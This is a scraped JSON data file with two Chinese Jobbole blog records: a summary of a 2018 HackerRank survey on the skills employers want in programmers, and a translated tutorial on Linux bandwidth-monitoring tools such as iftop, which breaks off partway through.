{"tags": "职场", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/07/b82c41ce36630a47a22e10059671eb52.jpg"], "title": "2018 年，程序员要具备哪些核心竞争力？", "fav_nums": 5, "url": "http://blog.jobbole.com/113525/", "create_date": "2018/01/25", "url_object_id": "0208b3d12db7cfc54ed61c6f01dabacd", "comment_nums": 3, "front_image_path": "full/8d41e17ba24bd494b959911d8123d0072c41e2a8.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/aoi\">伯小乐</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>近日国外开发者平台 HankerRank 发布了 2018 年开发者技能调查报告，本文摘录程序员求职时必备技能相关的调查结果。</p>\n<h3>雇主招人时，看中哪些核心竞争力？</h3>\n<ol>\n<li>问题解决能力（不管企业大小，都排第1）</li>\n<li>编程语言熟练程度（不管企业大小，排第2）</li>\n<li>调试（不管企业大小，排第3）</li>\n<li>系统设计（综合排第4）</li>\n<li>性能优化（综合排第5）</li>\n<li>剩下见下图</li>\n</ol>\n<p>相比中大型公司，小公司更为看中开发者对框架的熟练程度。因为小公司追求快启动，框架有助于开发者更快速地的推送代码。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1fnrq4faqh7j20fz0bhta9.jpg\"></p>\n<h3>雇主招人时，看中哪些任职资质？（普通招聘人员角度）</h3>\n<ol>\n<li>经历/经验</li>\n<li>portfolio/作品集（GitHub是开发者展现个人项目最佳方式之一）</li>\n<li>教育（学历/学位）</li>\n<li>培训（技能认证/证书）</li>\n<li>个人品牌</li>\n</ol>\n<p>有一种流行的观点认为，招聘人员更中意有名牌大学 CS 学位的人选。但事实证明，他们实际上关心的是你所做的，而不是你上学的地方。绝大多数的招聘经理表示，他们寻找开发者的技能证明，比如以往工作，多年的经验和项目/ GitHub。无论公司规模大小如何，90% 的招聘人员表示更看中开发者的「以往工作经验」和「多年的经验」。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fnrq4fw738j20fi0b5js3.jpg\"></p>\n<h3>主管们最看中什么样的任职资质？</h3>\n<ol>\n<li>portfolio/作品集（GitHub是开发者展现个人项目最佳方式之一）</li>\n<li>以往工作经验</li>\n<li>工作年限</li>\n<li>教育（学历/学位）</li>\n<li>培训（技能认证/证书）</li>\n<li>个人品牌</li>\n</ol>\n<p>现在很多公司在招 IT 技术人才时，会查看候选人的 GitHub 上的实际项目，以作为简历之外的技能评估补充。相比多年工作经验，创始人、CTO、VP 等主管人群更看重 GitHub 上的项目。</p>\n<p>他们不像普通招聘人员（HR）那样看重「学历/学位」。这可能是因为候选人进入由高管面试轮时，上一轮的 HR 已经筛选过了。到了这一轮时，有更多时间来根据以往项目来评估候选人的技能。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/7cc829d3ly1fnstmvkb7rj20fm0anq3p.jpg\"></p>\n<h3>相关文章</h3>\n<p>《<a href=\"http://blog.jobbole.com/113526/\" target=\"_blank\">2018 开发者技能调查：这些编程语言受欢迎</a>》</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113525\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113525votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113525\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">伯小乐</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/11/f2bb4f6f428a49476a2e91c355c8d150.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            伯乐在线小编一枚~~~~PS：我不是@小编辑，不要问我了        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/aoi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/aoi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/aoi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 261</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/10/9aeba2223d66a3c6692233694383abce.jpg"], "title": "三款简单而优秀的 Linux 网络监视工具", "fav_nums": 1, "url": "http://blog.jobbole.com/113549/", "create_date": "2018/01/27", "url_object_id": "b086f1733ad04a6091b002b7a9e6f100", "comment_nums": 0, "front_image_path": "full/a0c1bbf258eb5064ea3d6b896485a481525b7f95.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linux.com/learn/intro-to-linux/2017/10/3-simple-excellent-linux-network-monitors\">Carla Schroder</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9284-1.html\">Linux中国/nodekey</a>   </div><blockquote><p>通过 <code>iftop</code>、 <code>nethogs</code> 和 <code>vnstat</code> 详细了解你的网络连接状态。</p></blockquote>\n<p>你可以通过这三个 Linux 命令了解当前网络的大量信息。<code>iftop</code> 通过进程号跟踪网络连接，<code>nethogs</code> 快速告知你哪些进程在占用你的带宽，而 <code>vnstat</code> 以一个良好的轻量级守护进程在后台运行，并实时记录你的网络使用情况。</p>\n<h3 id=\"toc_1\">iftop</h3>\n<p>令人称赞的 <code>iftop</code> 可以监听您指定的网络接口，并以 top 的样式呈现。</p>\n<p>这是一个不错的小工具，可以用于找出网络拥塞，测速和维持网络流量总量。看到自己到底在用多少带宽往往是非常惊人的，尤其是对于我们这些仍然记得电话线路、调制解调器，“高速”到令人惊叫的 kb 和实时波特率的老人们。我们在很久之前就不再使用波特率，转而钟情于比特率。波特率用于衡量信号变化，尽管有时候与比特率相同，但大多数情况下并非如此。</p>\n<p>如果你只有一个网络接口，直接运行 <code>iftop</code> 即可。不过 <code>iftop</code> 需要 root 权限：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af36859412144231\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo iftop\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36859412144231-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36859412144231-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af36859412144231-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-i\">iftop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36859412144231-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>如果你有多个网络接口，那就指定你要监控的接口：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af36862683392573\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo iftop -i wlan0\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36862683392573-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36862683392573-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af36862683392573-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">iftop</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">wlan0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36862683392573-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>就像 <code>top</code> 命令一样，你可以在命令运行时更改显示选项：</p>\n<ul>\n<li><code>h</code> 切换帮助界面。</li>\n<li><code>n</code> 是否解析域名。</li>\n<li><code>s</code> 切换源地址的显示，<code>d</code> 则切换目的地址的显示。</li>\n<li><code>S</code> 是否显示端口号。</li>\n<li><code>N</code> 是否解析端口；若关闭解析则显示端口号。</li>\n<li><code>t</code> 切换文本显示界面。默认的显示方式需要 ncurses。我个人认为图 1 的显示方式在组织性和可读性都更加良好。</li>\n<li><code>p</code> 暂停显示更新。</li>\n<li><code>q</code> 退出程序。</li>\n</ul>\n<p><img title=\"text display\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/e648c6c2bf6d2eb4da04ede2c411d4b0.png\" alt=\"text display\"></p>\n<p><em>图 1:组织性和可读性良好的文本显示。</em></p>\n<p>当你切换显示设置的时候，<code>iftop</code> 并不会中断监测流量。当然你也可以单独监测一台主机。而这需要该主机的 IP 地址和子网掩码。现在，我很好奇 Pandora（LCTT 译注：一家美国的电台公司）能给我贫瘠的带宽带来多大的负载。因此我首先使用 dig 命令找到他们的 IP 地址：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af36867541040901\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ dig A pandora.com\r\n[...]\r\n;; ANSWER SECTION:\r\npandora.com.            267     IN      A       208.85.40.20\r\npandora.com.            267     IN      A       208.85.40.50\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36867541040901-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36867541040901-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36867541040901-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36867541040901-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36867541040901-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36867541040901-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af36867541040901-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">dig</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pandora</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">com</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36867541040901-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af36867541040901-3\"><span class=\"crayon-sy\">;</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ANSWER </span><span class=\"crayon-v\">SECTION</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36867541040901-4\"><span class=\"crayon-v\">pandora</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">267</span><span class=\"crayon-h\">     </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\">      </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">208.85.40.20</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af36867541040901-5\"><span class=\"crayon-v\">pandora</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">267</span><span class=\"crayon-h\">     </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\">      </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">208.85.40.50</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36867541040901-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>那子网掩码呢？<a href=\"https://www.linux.com/learn/intro-to-linux/2017/8/how-calculate-network-addresses-ipcalc\">ipcalc</a> 会告诉我们：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af3686b639434784\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ipcalc -b 208.85.40.20\r\nAddress:   208.85.40.20   \r\nNetmask:   255.255.255.0 = 24\r\nWildcard:  0.0.0.255  \r\n=&gt;\r\nNetwork:   208.85.40.0/24 \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3686b639434784-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3686b639434784-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3686b639434784-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3686b639434784-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3686b639434784-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3686b639434784-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3686b639434784-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af3686b639434784-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ipcalc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">208.85.40.20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3686b639434784-2\"><span class=\"crayon-v\">Address</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">208.85.40.20</span><span class=\"crayon-h\">   </span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3686b639434784-3\"><span class=\"crayon-v\">Netmask</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">255.255.255.0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">24</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3686b639434784-4\"><span class=\"crayon-v\">Wildcard</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.0.0.255</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3686b639434784-5\"><span class=\"crayon-o\">=</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3686b639434784-6\"><span class=\"crayon-v\">Network</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">208.85.40.0</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">24</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af3686b639434784-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>现在，将 IP 地址和子网掩码提供给 <code>iftop</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af3686e252844037\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sudo iftop -F 208.85.40.20/24 -i wlan0\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3686e252844037-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3686e252844037-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af3686e252844037-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">iftop</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">F</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">208.85.40.20</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">24</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">wlan0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3686e252844037-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>很棒的不是么？而我也很惊奇地发现，Pandora 在我的网络上，每小时大约使用 500kb。并且就像大多数流媒体服务一样，Pandora 的流量在迅速增长，并依靠缓存稳定下来。</p>\n<p>你可以使用 <code>-G</code> 选项对 IPv6 地址执行相同的操作。查阅友好的 man 可以帮助你了解 <code>iftop</code> 的其他功能，包括使用个人配置文件自定义你的默认选项，以及使用自定义过滤（请参阅 <a href=\"http://www.tcpdump.org/manpages/pcap-filter.7.html\">PCAP-FILTER</a> 